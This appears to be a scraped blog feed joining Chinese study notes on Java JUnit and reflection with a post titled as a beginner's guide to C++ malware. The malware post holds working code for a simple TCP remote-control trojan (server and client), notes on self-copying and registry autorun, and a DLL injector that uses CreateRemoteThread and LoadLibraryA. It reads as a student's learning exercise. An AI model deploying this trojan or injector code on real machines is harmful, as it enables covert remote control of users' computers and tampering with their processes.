用于资源的申请，所有测试方法执行之前都会先执行该方法 在测试方法之前被自动执行 @After 释放资源 在所有测试方法执行完后都会自动执行该方法 测试方法执行之后自动执行 12345678910111213//初始化方法//用于资源的申请，所有测试方法执行之前都会先执行该方法@Beforepublic void init()&#123; System.out.println(&quot;init...&quot;);&#125;//释放资源//在所有测试方法执行完后都会自动执行该方法@Afterpublic void close()&#123; System.out.println(&quot;closed&quot;);&#125; 反射 框架设计的灵魂 框架：半成品软件。可以在框架基础上继续开发，简化编码 反射：将类的各个组成部分封装为其他对象（反射机制） 好处： 在程序运行中操作这些对象 可以解耦，提高程序可拓展性 Java代码运行阶段 获取Class对象方式 Source： 对用于配置文件，将类名定义在配置文件中。读取文件，加载类 Class.forName(“全类名”)：将字节码文件加载进内存返回class对象 Class： 多用于参数传递 依据类名属性class，获取class对象 Runtime 多用于对象的获取字节码的方式 对象.getClass()：方法封装在Object中，被所有对象继承了 同一个字节码文件在同一次程序运行中，只会被加载一次；不论通过那种方式取得，都是同一个对象 每个类对象都不同 使用class对象 功能： 获取： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package LearnJunit.domain;public class Person &#123; private String name; private int age; public String a; protected String b; String c; private String d; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, a=&#x27;&quot; + a + &#x27;\\&#x27;&#x27; + &quot;, b=&#x27;&quot; + b + &#x27;\\&#x27;&#x27; + &quot;, c=&#x27;&quot; + c + &#x27;\\&#x27;&#x27; + &quot;, d=&#x27;&quot; + d + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 获取成员变量们 Field[] getFields()：获取所有public成员变量 1234Field[] fields = personClass.getFields();for (Field field: fields)&#123; System.out.println(field);&#125; Field getField(String name)：获取所有指定名称public成员变量 1Field a = personClass.getField(&quot;a&quot;); Field[] getDeclaredFields() 12345//获取所有成员变量，不考虑修饰Field[] DeclaredFields = personClass.getDeclaredFields();for (Field getDeclaredField: DeclaredFields)&#123; System.out.println(getDeclaredField);&#125; Field getDeclaredField(String name) 反射私有、保护成员变量，要设置忽略访问权限的修饰符安全监测 1234567//1.4获取单个私有System.out.println(&quot;---------------&quot;);Field d = personClass.getDeclaredField(&quot;d&quot;);//1.4.1忽略安全访问d.setAccessible(true);//暴力反射Object value2 = d.get(p);System.out.println(value2); 获取构造方法们 Constructor&lt;?&gt;[] getConstructors() 12Constructor constructor = personClass.getConstructor(String.class, int.class);System.out.println(constructor); Constructor&lt;T&gt; getConstructor(String name) Constructor&lt;?&gt;[] getDeclaredConstructors() Constructor&lt;T&gt; getDeclaredConstructor(String name) 获取成员方法们 method[] getMethods() 12345//获取所有public修饰方法Method[] funcs = personClass.getMethods();for (Method func:funcs)&#123; System.out.println(func);&#125; 123456789101112131415public java.lang.String LearnJunit.domain.Person.toString()public java.lang.String LearnJunit.domain.Person.getName()public void LearnJunit.domain.Person.setName(java.lang.String)public int LearnJunit.domain.Person.getAge()public void LearnJunit.domain.Person.setAge(int)public void LearnJunit.domain.Person.eat()public void LearnJunit.domain.Person.eat(java.lang.String)public final void java.lang.Object.wait() throws java.lang.InterruptedExceptionpublic final void java.lang.Object.wait(long,int) throws java.lang.InterruptedExceptionpublic final native void java.lang.Object.wait(long) throws java.lang.InterruptedExceptionpublic boolean java.lang.Object.equals(java.lang.Object)public native int java.lang.Object.hashCode()public final native java.lang.Class java.lang.Object.getClass()public final native void java.lang.Object.notify()public final native void java.lang.Object.notifyAll() 因为Person类继承的是Object对象，所以有些隐藏函数，即从Object继承下来的函数 method getMethod(String name) 12345 //获取指定方法名称//名字，参数列表匹配 Method eat = personClass.getMethod(&quot;eat&quot;); Method eat2 = personClass.getMethod(&quot;eat&quot;,String.class); eat2.invoke(p,&quot;fish&quot;); method[] getDeclaredMethods() method getDeclaredMethod(String name) 获取类名 String getName() 操作 Field成员变量 设置值（get） 12345Field a = personClass.getField(&quot;a&quot;);//获取成员变量a的值Person p = new Person();Object value = a.get(p);System.out.println(value); 获取值（set） 12a.set(p,&quot;John&quot;);System.out.println(p); 暴力反射：.setAccessible(true); 对所有反射都有效 搭配getDeaclearedXXX使用 这仅仅是打印名称和比较，不需要设置；但是如果要对对象进行相关操作，必须设置；不设置的话操作受限。 Constructor构造方法 创建对象 T newInstance(Object... initargs) 123//1.2创建对象Object person = constructor.newInstance(&quot;Jonh&quot;,5);System.out.println(person); 如果构造使用空参创造对象，可简化 class对象的 newInstance 123Object o = personClass.newInstance();System.out.println(o);System.out.println(&quot;-------------&quot;); Method成员对象 执行方法 123456//获取指定方法名称Method eat = personClass.getMethod(&quot;eat&quot;);//创建方法对象Person p = new Person();//执行方法eat.invoke(p); 获取方法名称 1System.out.println(func.getName()); 获取类名 123//获取类名String classname = personClass.getName();System.out.println(classname); 反射案例 案例： 需求：一个框架，可以帮我们创建任意类的对象，并且执行任意方法 不能改变该类的任何代码， 创建任意对象执行任意方法 一般方式： 12345678910package LearnJunit.reflect;import LearnJunit.domain.Person;//假设框架类public class ReflectFramework &#123; public static void main(String[] args) &#123; //可以创建任意类对象，可以执行任意方法 Person p = new Person(); p.eat(); &#125;&#125; 这里的框架是提前学好的，不能改变；若要使用student类，则代码会改变 实现 配置文件 反射 步骤 将需要创建的对象的全类名和需要执行的方法定义在配置文件中 src中创建配置文件 12className=LearnJunit.domain.PersonmethodName=eat 在程序中加载读取配置文件 1234567891011//1.加载配置文件//1.1创建配置对象Properties pro = new Properties();//1.2加载配置文件，转换为集合//1.2.1获取class目录下配置文件ClassLoader classLoader = ReflectFramework.class.getClassLoader();//获得当前类路径InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;);//读取路径下的config.propertiespro.load(is);//2.获取配置文件中定义的数据String className = pro.getProperty(&quot;className&quot;);String methodName = pro.getProperty(&quot;methodName&quot;); 使用反射技术来加载类文件进内存，创建对象并执行方法 1234567//3.加载类进内存Class cls = Class.forName(className);//4.创建对象Object obj = cls.newInstance();//5.获取方法对象Method method = cls.getMethod(methodName);method.invoke(obj); 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package LearnJunit.reflect;import LearnJunit.domain.Person;import LearnJunit.domain.Student;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;import java.util.stream.IntStream;//假设框架类public class ReflectFramework &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException, NoSuchMethodException &#123; //可以创建任意类对象，可以执行任意方法 //不能改变该类的任何代码， //创建任意对象执行任意方法 //1.加载配置文件 //1.1创建配置对象 Properties pro = new Properties(); //1.2加载配置文件，转换为集合 //1.2.1获取class目录下配置文件 ClassLoader classLoader = ReflectFramework.class.getClassLoader(); InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;); pro.load(is); //2.获取配置文件中定义的数据 String className = pro.getProperty(&quot;className&quot;); String methodName = pro.getProperty(&quot;methodName&quot;); //3.加载类进内存 Class cls = Class.forName(className); //4.创建对象 Object obj = cls.newInstance(); //5.获取方法对象 Method method = cls.getMethod(methodName); method.invoke(obj); &#125;&#125; 这样只需要修改配置文件就可以了","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"【免杀】C++恶意软件入门笔记","slug":"Maleware","date":"2021-03-30T03:01:00.000Z","updated":"2023-06-13T05:13:20.740Z","comments":true,"path":"2021/03/30/Maleware/","link":"","permalink":"https://joe1sn.eu.org/2021/03/30/Maleware/","excerpt":"C++恶意软件入门笔记，高中看的一本书，大二小小实践一下","text":"C++恶意软件入门笔记，高中看的一本书，大二小小实践一下 简单的Windows API 复制自身到Windows目录 1-1.获得程序自生API DWORD GetModuleFileName 1-2.获得windows目录 UINT GetWindowsDirectory 1-3.拷贝文件 BOOL CopyFile 获得系统基本参数 2-1.获得操作系统版本 BOOL GetVersionEx typedef struct _OSVERSIONINFOA &#123; DWORD dwOSVersionInfoSize; DWORD dwMajorVersion; DWORD dwMinorVersion; DWORD dwBuildNumber; DWORD dwPlatformId; CHAR szCSDVersion[128]; // Maintenance string for PSS usage &#125; OSVERSIONINFOA, * POSVERSIONINFOA, * LPOSVERSIONINFOA; &lt;!--code￼0--&gt; TCP//IP连接木马 简单的TCP/IP测试 server 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;Winsock2.h&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;//链接dll// 使用该函数来初始化ws2_32.dll//int WSAStartup//释放Dll// int WSACleanuo(void)//创建的套接字// SOCKET socket// (WSAAPI* LPFN_SOCKET)(// _In_ int af, //通讯协议簇// _In_ int type, //要创建的套接字类型// _In_ int protocol //指定程序所用的通讯协议// );//关闭套接字// closesocket//绑定IP和端口// int bind (SOCKET s, socketaddr, int namelen)//WSAStartup-&gt;socket-&gt;bind-&gt;listen-&gt;accept-&gt;send/recv-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.初始化ws2_32.dll WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &amp;wsaData); //2.创建socket套接字 // 通讯协议簇 套接字类型 通讯协议 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //socket对象 s sockaddr_in sockaddr; //socket 等待对象sockaddr sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);//点地址 sockaddr.sin_port = htons(1000); //设置端口 //3.绑定ip和端口 bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型 //4.监听 listen(s, 1); cout &lt;&lt; &quot;Start Listenning\\n&quot;; //4.等待连接 SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象 cout &lt;&lt; &quot;Client is on!\\n&quot;; //5.recv || send char msg[] = &quot;hello from server\\n&quot;; send(clientSock, msg, strlen(msg)+sizeof(char), NULL); cout &lt;&lt; &quot;Sending Message\\n&quot;; //6.断开Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.释放ws2_32库 WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;//WSAstartup-&gt;socket-&gt;connect-&gt;recv/send-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2,2),&amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.连接到server connect(s, (SOCKADDR *) &amp;sockaddr, sizeof(SOCKADDR)); //4.设置数据缓冲区 char szBuffer[MAXBYTE]; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; &quot;This is msg from server\\n&quot;; cout &lt;&lt; &quot; &quot; &lt;&lt; szBuffer; //5.关闭socket closesocket(s); WSACleanup(); return 0;&#125; SimpleTCPTorjan server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;cstring&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//1.完成功能命令的发送//2.可以查看远程主机的相关信息，以及复制自身到可执行目录//3.打开/关闭光驱//4.交换和恢复鼠标左右键//宏定义帮助菜单#define HELP &quot;help - Show Help Menu\\n&quot; \\ &quot;getsysinfo - Get System Info\\n&quot; \\ &quot;open - Open The CDRom\\n&quot; \\ &quot;close - Close The CSRom\\n&quot; \\ &quot;swap - Swap Mouse Button\\n&quot; \\ &quot;restore - Restore Mouse Button\\n&quot; \\ &quot;exit - Quit Shell\\n&quot;int main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.绑定ip和端口 bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型 listen(s, 1); //4.等待连接 SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象 cout &lt;&lt; &quot;Client is on!\\n&quot;; //开始监听 char CMD[MaxBuf]; char recver[MaxBuf]; memset(CMD, 0, MaxBuf); while (1) &#123; cin &gt;&gt; CMD; if (!strcmp(CMD, &quot;help&quot;)) cout &lt;&lt; HELP &lt;&lt; endl; else if (!strcmp(CMD, &quot;getsysinfo&quot;)) &#123; send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); char temp[MaxBuf]; memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); cout &lt;&lt; &quot;recved?\\n&quot;; cout &lt;&lt; temp &lt;&lt;endl; &#125; else send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); memset(CMD, 0, MaxBuf); &#125; //6.断开Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.释放ws2_32库 WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;windows.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//打开或关闭光驱//VOID SetCdaudio(BOOL bOpen)//&#123;// if (bOpen)// mciSendStringA(&quot;set cdaudio door open&quot;,NULL,NULL,NULL);// else// mciSendStringA(&quot;set cdaudio door clsoed&quot;, NULL, NULL, NULL);//&#125;VOID MouseSwap(BOOL bSwap)&#123; if (bSwap) SwapMouseButton(TRUE); else SwapMouseButton(FALSE);&#125;//对命令进行解析BOOL Dispatch(SOCKET &amp;sock, char* szCmd)&#123; BOOL bRet = FALSE; if (!strcmp(szCmd, &quot;getsysinfo&quot;)) &#123; char szComputerName[MaxBuf]; char szUserName[MaxBuf]; DWORD buffer1 = MaxBuf; GetComputerNameA(szComputerName, &amp;buffer1); DWORD buffer2 = MaxBuf; GetUserNameA(szUserName, &amp;buffer2); strcat(szUserName, &quot;@&quot;); strcat(szUserName, szComputerName); cout &lt;&lt; szUserName &lt;&lt; endl; send(sock, szUserName, strlen(szUserName) + sizeof(char),NULL); bRet = 1; &#125; //else if (!strcmp(szCmd, &quot;open&quot;)) //&#123; // SetCdaudio(1); // bRet = 1; //&#125; //else if (!strcmp(szCmd, &quot;clsoe&quot;)) //&#123; // SetCdaudio(0); // bRet = 1; //&#125; else if (!strcmp(szCmd, &quot;swap&quot;)) &#123; MouseSwap(1); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;restore&quot;)) &#123; MouseSwap(0); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;exit&quot;)) exit(0); else bRet = 0; return bRet;&#125;int main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.连接到server connect(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //4.设置数据缓冲区 char szBuffer[MAXBYTE]; memset(szBuffer, 0, MaxBuf); while (1) &#123; if (s) &#123; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; szBuffer &lt;&lt; endl; Dispatch(s, szBuffer); memset(szBuffer, 0, MaxBuf); &#125; &#125; //5.关闭socket closesocket(s); WSACleanup(); return 0;&#125; client回传计算机相关信息有问题 Windows文件操作相关API 注册表相关 1.打开注册表 12345678WINADVAPILSTATUSAPIENTRYRegOpenKeyA ( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _Out_ PHKEY phkResult ); 使用 12HKEY hKey;long lRet = RegOpenKey(keysname, REG_RUN, &amp;hKey); 2.注册表查询 https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya 1234567891011121314151617WINADVAPILSTATUSAPIENTRYRegQueryInfoKeyA( _In_ HKEY hKey, //子键句柄 _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass, //指向缓冲区的指针，该缓冲区接收用户定义的键类。此参数可以为NULL。 _Inout_opt_ LPDWORD lpcchClass, //该变量指定lpClass参数指向的缓冲区的大小 _Reserved_ LPDWORD lpReserved, //此参数是保留参数，必须为NULL。 _Out_opt_ LPDWORD lpcSubKeys, //指向一个变量的指针，该变量接收指定键所包含的子键的数量。此参数可以为NULL _Out_opt_ LPDWORD lpcbMaxSubKeyLen,//指向变量的指针，该变量以最长的名称接收键的子键的大小，以Unicode字符表示，不包括终止的空字符 _Out_opt_ LPDWORD lpcbMaxClassLen,//指向变量的指针，该变量接收以Unicode字符表示的指定子项类的最长字符串的大小 _Out_opt_ LPDWORD lpcValues, //指向变量的指针，该变量接收与键关联的值的数量 _Out_opt_ LPDWORD lpcbMaxValueNameLen,//指向变量的指针，该变量接收键的最长值名称的大小（以Unicode字符表示） _Out_opt_ LPDWORD lpcbMaxValueLen,//指向一个变量的指针，该变量接收键值中最长的数据分量的大小（以字节为单位） _Out_opt_ LPDWORD lpcbSecurityDescriptor,//指向一个变量的指针，该变量接收密钥的安全描述符的大小 _Out_opt_ PFILETIME lpftLastWriteTime//指向接收最后写入时间的FILETIME结构的指针 。此参数可以为NULL ); 3.注册表写入 1234567891011WINADVAPILSTATUSAPIENTRYRegSetKeyValueA( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ LPCSTR lpValueName, _In_ DWORD dwType, _In_reads_bytes_opt_(cbData) LPCVOID lpData, _In_ DWORD cbData ); 4.注册表值的枚举 12345678910111213WINADVAPILSTATUSAPIENTRYRegEnumKeyExA( _In_ HKEY hKey, _In_ DWORD dwIndex, //查询索引 _Out_writes_to_opt_(*lpcchName,*lpcchName + 1) LPSTR lpName,//子键名称 _Inout_ LPDWORD lpcchName, //如果函数成功，则由lpcName指向的变量将包含存储在缓冲区中的字符数，不包括终止的空字符 _Reserved_ LPDWORD lpReserved, //此参数是保留参数，必须为NULL _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass,//该缓冲区接收枚举子项的用户定义类 _Inout_opt_ LPDWORD lpcchClass, //如果函数成功，则lpcClass包含缓冲区中存储的字符数，不包括终止的空字符 _Out_opt_ PFILETIME lpftLastWriteTime//指向FILETIME结构的指针，该结构接收上一次写入枚举子键的时间 ); 5.键值删除 1234567WINADVAPILSTATUSAPIENTRYRegDeleteKeyA ( _In_ HKEY hKey, _In_ LPCSTR lpSubKey ); 文件操作相关 1.打开文件 123456789CreateFileA( _In_ LPCSTR lpFileName, //要打开的文件名字 _In_ DWORD dwDesiredAccess, //访问模式 _In_ DWORD dwShareMode, //文件的共享模式 _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, //安全属性 _In_ DWORD dwCreationDisposition, //创建或打开文件不存在时的操作 _In_ DWORD dwFlagsAndAttributes, //创建或打开文件的标志和属性 _In_opt_ HANDLE hTemplateFile //文件模板); 2.关闭文件 123CloseHandle( _In_ _Post_ptr_invalid_ HANDLE hObject ); 3.删除文件 12345BOOLWINAPIDeleteFileA( _In_ LPCSTR lpFileName ); 4.读函数 1234567891011WINBASEAPI_Must_inspect_result_BOOLWINAPIReadFile( _In_ HANDLE hFile, //文件句柄 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesReashud) __out_data_source(FILE) LPVOID lpBuffer, //指向一个缓冲区，把数据读取到里面 _In_ DWORD nNumberOfBytesToRead, //要读取的字节数 _Out_opt_ LPDWORD lpNumberOfBytesRead, //返回实际的读取数 _Inout_opt_ LPOVERLAPPED lpOverlapped //一般设置为NULL ); 5.写函数 12345678910WINBASEAPIBOOLWINAPIWriteFile( _In_ HANDLE hFile, _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped ); 6.设置文件指针 123456789WINBASEAPIDWORDWINAPISetFilePointer( _In_ HANDLE hFile, //打开的文件句柄 _In_ LONG lDistanceToMove, //指定要移动的距离 _Inout_opt_ PLONG lpDistanceToMoveHigh, //要移动距离的高32位 _In_ DWORD dwMoveMethod //指定移动位置 ); 7.创建目录 1234567WINBASEAPIBOOLWINAPICreateDirectoryA( _In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes ); 8.移动目录 123456WINBASEAPIBOOLWINAPIRemoveDirectoryA( _In_ LPCSTR lpPathName ); AutoImmunity的MFC初体验 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// AutoRunImmunity.cpp: 定义应用程序的类行为。//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;AutoRunImmunity.h&quot;#include &quot;AutoRunImmunityDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CAutoRunImmunityAppBEGIN_MESSAGE_MAP(CAutoRunImmunityApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CAutoRunImmunityApp 构造CAutoRunImmunityApp::CAutoRunImmunityApp()&#123; // 支持重新启动管理器 m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: 在此处添加构造代码， // 将所有重要的初始化放置在 InitInstance 中&#125;// 唯一的 CAutoRunImmunityApp 对象CAutoRunImmunityApp theApp;// CAutoRunImmunityApp 初始化BOOL CAutoRunImmunityApp::InitInstance()&#123; // 如果一个运行在 Windows XP 上的应用程序清单指定要 // 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式， //则需要 InitCommonControlsEx()。 否则，将无法创建窗口。 INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // 将它设置为包括所有要在应用程序中使用的 // 公共控件类。 InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // 创建 shell 管理器，以防对话框包含 // 任何 shell 树视图控件或 shell 列表视图控件。 CShellManager *pShellManager = new CShellManager; // 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题 CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // 标准初始化 // 如果未使用这些功能并希望减小 // 最终可执行文件的大小，则应移除下列 // 不需要的特定初始化例程 // 更改用于存储设置的注册表项 // TODO: 应适当修改该字符串， // 例如修改为公司或组织名 SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;)); CAutoRunImmunityDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: 在此放置处理何时用 // “确定”来关闭对话框的代码 &#125; else if (nResponse == IDCANCEL) &#123; // TODO: 在此放置处理何时用 // “取消”来关闭对话框的代码 &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\\n&quot;); TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\\n&quot;); &#125; // 删除上面创建的 shell 管理器。 if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序， // 而不是启动应用程序的消息泵。 return FALSE;&#125; DLL注入 DLL_Helloworld 1234567891011121314151617181920212223242526272829303132333435363738394041424344// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;const int MaxLen = 0x50;//extern &quot;C&quot; __declspec(dllexport) //VOID MsgBox(wchar_t*szMsg)//&#123;// wchar_t szModuleName[MaxLen];// GetModuleFileName(NULL, szModuleName, MaxLen);// MessageBox(NULL,szMsg,szModuleName,MB_OK);//&#125;VOID MsgBox(wchar_t* szMsg)&#123; wchar_t szModuleName[MaxLen]; GetModuleFileName(NULL, szModuleName, MaxLen); MessageBoxW(NULL, szMsg, szModuleName, MB_OK);&#125;BOOL APIENTRY DllMain(HMODULE hModule, //DLL模块句柄 DWORD ul_reason_for_call,//被调用原因 LPVOID lpReserved //保留想，傻逼windows)//入口函数&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; MessageBoxA(NULL, &quot;HI&quot;, &quot;Attached&quot;, MB_OK); break; &#125; case DLL_THREAD_ATTACH: &#123; MsgBox((wchar_t*)&quot;Thread attached&quot;); break; &#125; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; DLL注入 注入器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;string&gt;#include &lt;cstring&gt;const int MaxLen = 0x50;using namespace std;int main()&#123; char DllPath[MaxLen]; DWORD PID; cout &lt;&lt; &quot;Which DLL To Load?\\n&quot;; cin &gt;&gt; DllPath; if (DllPath == NULL) cout &lt;&lt; &quot;This Dll Not exsits\\n&quot;; cout &lt;&lt; DllPath &lt;&lt; endl; //LoadLibraryA((LPCSTR)DllPath); cout &lt;&lt; &quot;Which Program want to hijack?\\n&quot;; cin &gt;&gt; PID; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID); if (hProcess == NULL) &#123; cout &lt;&lt; &quot;This process is missing\\n&quot;; exit(-1); &#125; int DllLen = strlen(DllPath) + sizeof(char); PVOID pDllAddr = VirtualAllocEx( hProcess,NULL,DllLen,MEM_COMMIT,PAGE_READWRITE ); if (pDllAddr == NULL) &#123; CloseHandle(hProcess); cout &lt;&lt; &quot;Handle ERROR\\n&quot;; exit(-1); &#125; DWORD dwWriteNum = 0; cout &lt;&lt; &quot;Writting Mem\\n&quot;; WriteProcessMemory( hProcess, pDllAddr, DllPath, DllLen, &amp;dwWriteNum ); cout &lt;&lt; &quot;GetProcAddr\\n&quot;; FARPROC pFunAddr = GetProcAddress( GetModuleHandle((LPCWSTR)&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot; ); cout &lt;&lt; &quot;CreateRemoteThread\\n&quot;; HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, 0, NULL ); cout &lt;&lt; &quot;Close Handles\\n&quot;; WaitForSingleObject(hThread,INFINITE); CloseHandle(hThread); CloseHandle(hProcess);&#125; 待注入DLL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// Injector.cpp: 定义应用程序的类行为。//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;Injector.h&quot;#include &quot;InjectorDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CInjectorAppBEGIN_MESSAGE_MAP(CInjectorApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CInjectorApp 构造CInjectorApp::CInjectorApp()&#123; // 支持重新启动管理器 m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: 在此处添加构造代码， // 将所有重要的初始化放置在 InitInstance 中&#125;// 唯一的 CInjectorApp 对象CInjectorApp theApp;// CInjectorApp 初始化BOOL CInjectorApp::InitInstance()&#123; // 如果一个运行在 Windows XP 上的应用程序清单指定要 // 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式， //则需要 InitCommonControlsEx()。 否则，将无法创建窗口。 INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // 将它设置为包括所有要在应用程序中使用的 // 公共控件类。 InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); 